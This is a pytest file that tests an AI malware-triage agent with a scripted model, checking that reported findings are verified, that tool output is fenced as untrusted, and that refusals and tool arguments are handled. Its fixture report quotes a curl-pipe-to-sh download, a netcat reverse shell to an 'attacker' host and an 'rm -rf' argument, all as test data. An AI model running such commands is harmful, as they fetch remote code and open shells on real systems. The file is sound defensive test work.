"""The agent loop with a scripted model (no network) and the real tools on local files."""

from pathlib import Path
from types import SimpleNamespace as NS

import pytest

from aegis_worker_b import agent, sandbox_tools
from aegis_worker_b.samples import by_name


def block_use(name, inp, id_="t1"):
    return NS(type="tool_use", name=name, input=inp, id=id_)


def reply(*blocks, stop="tool_use"):
    return NS(content=list(blocks), stop_reason=stop, usage=NS(input_tokens=10, output_tokens=5, cache_read_input_tokens=0))


class ScriptedModel:
    def __init__(self, replies):
        self.replies = list(replies)
        self.calls = []

    def create(self, **kw):
        self.calls.append({**kw, "messages": list(kw["messages"])})
        return self.replies.pop(0)


@pytest.fixture
def sample_file(tmp_path):
    def make(name):
        s = by_name()[name]
        p = tmp_path / s.filename
        p.write_bytes(s.data)
        return s, str(p)

    return make


def local_tools(path):
    return lambda tool, args: sandbox_tools.TOOLS[tool](path, *args)


def run(model, s, path):
    return agent.analyze(
        filename=s.filename, sha256="x" * 64, size=len(s.data), head=s.data[:4096],
        run_tool=local_tools(path), messages_api=model,
    )


def test_tools_then_a_verified_report(sample_file):
    s, path = sample_file("sh-dropper")
    model = ScriptedModel([
        reply(block_use("identify", {}, "a"), block_use("code_patterns", {"language": "shell"}, "b")),
        reply(block_use("submit_report", {
            "verdict": "malicious", "confidence": "high", "summary": "Downloads and runs a script.",
            "file_type": "POSIX shell script", "playbook_rows": [".sh, .bash, .ps1"],
            "vulnerabilities": [
                {"type": "command injection", "severity": "high", "tool": "code_patterns", "location": "line 2",
                 "evidence": "curl -s https://example.invalid/agent.sh | sh", "explanation": "pipes a download to sh"},
                {"type": "made up", "severity": "high", "tool": "code_patterns", "location": "line 9",
                 "evidence": "nc -e /bin/sh attacker 4444", "explanation": "not in the file"},
                {"type": "never ran", "severity": "high", "tool": "bandit", "location": "line 1",
                 "evidence": "curl -s https://example.invalid/agent.sh", "explanation": "bandit never ran"},
            ],
            "unknowns": [],
        }), stop="tool_use"),
    ])
    res = run(model, s, path)
    assert res.verdict == "malicious" and res.stop == "submitted" and res.turns == 2
    assert [v["verified"] for v in res.vulnerabilities] == [True, False, False]
    assert [t["tool"] for t in res.tool_log] == ["identify", "code_patterns"]
    # The playbook went in the cached system prompt; the suggested plan in the brief.
    first = model.calls[0]
    assert "file_types_vulnerabilities.md" in first["system"][0]["text"]
    assert first["system"][0]["cache_control"] == {"type": "ephemeral"}
    assert "shellcheck" in first["messages"][0]["content"]
    assert first["output_config"] == {"effort": "medium"}


def test_tool_output_is_fenced_as_untrusted(sample_file):
    s, path = sample_file("sh-dropper")
    model = ScriptedModel([reply(block_use("read_lines", {"start": 1, "count": 5})), reply(stop="end_turn"), reply(stop="end_turn")])
    run(model, s, path)
    result = model.calls[1]["messages"][2]["content"][0]["content"]
    assert result.startswith(agent.FENCE_OPEN) and result.endswith(agent.FENCE_CLOSE)
    assert "curl" in result


def test_no_report_ends_unknown_after_one_nudge(sample_file):
    s, path = sample_file("py-clean")
    model = ScriptedModel([reply(stop="end_turn"), reply(stop="end_turn")])
    res = run(model, s, path)
    assert res.verdict == "unknown" and len(model.calls) == 2
    assert "submit_report" in model.calls[1]["messages"][-1]["content"]


def test_refusal_ends_unknown(sample_file):
    s, path = sample_file("py-clean")
    res = run(ScriptedModel([reply(stop="refusal")]), s, path)
    assert res.verdict == "unknown" and "declined" in res.summary


def test_arguments_are_clamped_to_the_schema():
    assert agent._args("code_patterns", {"language": "rm -rf"}) == ["shell"]
    assert agent._args("read_lines", {"start": 3, "count": 9}) == ["3", "9"]
    assert agent._args("identify", {"anything": "x"}) == []


def test_tool_definitions_are_strict_and_cover_every_tool():
    defs = {d["name"]: d for d in agent.tool_definitions()}
    assert set(defs) == set(sandbox_tools.TOOLS) | {"submit_report"}
    assert all(d["strict"] and d["input_schema"]["additionalProperties"] is False for d in defs.values())


@pytest.mark.parametrize("name,verdict", [("zip-slip", "malicious"), ("py-cmd-injection", "suspicious"), ("py-clean", "clean")])
def test_baseline_rules(sample_file, name, verdict):
    s, path = sample_file(name)
    res = agent.baseline(filename=s.filename, head=s.data[:4096], run_tool=local_tools(path))
    assert res.verdict == verdict and res.analyst == "rules"
